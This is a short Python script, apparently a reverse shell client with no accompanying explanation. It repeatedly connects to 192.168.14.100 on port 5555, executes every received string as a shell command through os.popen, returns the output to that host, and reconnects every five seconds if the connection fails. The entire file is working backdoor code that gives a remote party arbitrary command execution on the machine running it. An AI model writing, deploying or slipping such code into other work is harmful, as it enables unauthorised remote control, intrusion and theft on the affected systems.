from socket import *
import os, time

while True:
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("192.168.14.100", 5555))

        while True:
            data = client.recv(2048).decode()

            if data == "exit":
                client.close()
                break

            result = os.popen(data).read()
            client.sendall(result.encode())
    except:
        print("Server down, retry in 5 seconds.")
        time.sleep(5)
        continue

